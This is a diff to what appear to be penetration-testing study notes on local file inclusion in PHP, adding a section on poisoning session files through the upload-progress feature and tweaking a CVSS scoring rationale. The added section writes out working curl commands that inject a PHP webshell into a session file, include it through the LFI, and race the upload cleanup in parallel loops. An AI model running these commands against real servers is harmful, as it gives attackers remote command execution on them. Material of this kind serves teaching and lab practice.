@@ -307,6 +307,66 @@ curl -s 'http://target/login.php' \
 
 Only include-family executes it (read-family, e.g. `file_get_contents`, prints the file as text). If the app never writes attacker-controlled data into `$_SESSION`, this channel has no content source — dead end on that endpoint.
 
+#### `PHP_SESSION_UPLOAD_PROGRESS` — the poison channel that needs NO app support
+
+The variant above depends on the app storing our input in `$_SESSION`. This one doesn't: PHP's **upload progress feature** writes a `upload_progress_<name>` record into the session file *automatically* — before the application code even runs. The `<name>` is verbatim attacker bytes: the field literally works like User-Agent in log poisoning, but straight into `sess_<id>`.
+
+Governing php.ini directives (Debian leaves them **commented → defaults shown**):
+
+```ini
+session.upload_progress.enabled = On    ; feature on by default
+session.upload_progress.cleanup = On    ; record is WIPED the moment the upload finishes
+session.upload_progress.prefix = "upload_progress_"
+session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"   ; trigger field name
+session.upload_progress.freq = "1%"
+session.upload_progress.min_freq = "1"
+```
+
+The write is unconditional — a multipart POST carrying the trigger field + our own session id is all it takes:
+
+```bash
+curl -s -X POST \
+     -b 'PHPSESSID=poison123' \
+     -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["cmd"]); ?>' \
+     -F 'file=@/path/to/big.bin' \
+     'http://target/index.php'
+```
+
+The session file now contains our PHP in cleartext next to the serialized progress record:
+
+```text
+# /var/lib/php/sessions/sess_poison123:
+upload_progress_<?php system($_GET["cmd"]); ?>|a:5:{s:10:"start_time";i:17616...;}
+```
+
+Include it through the LFI (`include-family` again!) and it executes:
+
+```http
+?language=/var/lib/php/sessions/sess_poison123&cmd=id
+```
+
+**The race.** With `cleanup=On` (default) the record is deleted as soon as the upload completes — so the only window is *while bytes are still flowing*. Two loops, run in parallel:
+
+```bash
+# poisoner loop: a FAT file keeps the upload (and the record) alive as long as possible
+while true; do
+    curl -s -X POST -b 'PHPSESSID=poison123' \
+         -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["cmd"]); ?>' \
+         -F 'file=@/root/1GB.bin' \
+         'http://target/index.php'
+done
+
+# reader loop: hammer the include until the webshell answers
+while true; do
+    curl -s 'http://target/index.php?language=/var/lib/php/sessions/sess_poison123&cmd=id' \
+        | grep -q 'uid=' && echo HIT && break
+done
+```
+
+If `session.upload_progress.cleanup = Off` on the target, the record survives the request: one poisoning POST, then a single include — no race needed.
+
+Why this variant matters despite the race: it works on **any** PHP endpoint (no login, no app-side session writes, no upload acceptance checks — the trigger field rides along *with* a request to any script), which is exactly why it's the textbook fallback when `sess_`-poisoning via app fields is unavailable. Compare the walkthrough: §4.9 showed `session.upload_progress.*` commented in the lab's php.ini — "theoretically available" there — but both LFI endpoints were read-family, so the record would have displayed as text, not executed.
+
 ---
 
 ## 3. Automating discovery: fuzzing LFI
@@ -1352,7 +1412,7 @@ Reasoning behind the RCE vector:
 
 - **`AV:N` (network)** — both LFI veins on the demonstration target were reachable by an unauthenticated HTTP request
 - **`AC:L` (low)** — no obstacles beyond reading the app: no race, no special timing (`PHP_SESSION_UPLOAD_PROGRESS`-style races score differently), the double-decode bypass is deterministic
-- **`PR:N` (none)** — `contact.php?region=` and the upload form both worked pre-authentication; if the vulnerable endpoint sat behind a login (like THM's `profile.php` admin app), it becomes `PR:L` → **8.8**
+- **`PR:N` (none)** — `contact.php?region=` and the upload form both worked pre-authentication; if the vulnerable endpoint sat behind a login, it becomes `PR:L` → **8.8**
 - **`S:U` (unchanged)** — RFI/SMB (+`S:C`) extensions aren't always present; this chain kept everything within one server process
 - **`C:H / I:H / A:H`** — webshell = unrestricted shell commands as `www-data`: full read, full write (permanent shell in the webroot), and "delete the flag"/crash-the-box level effects
 
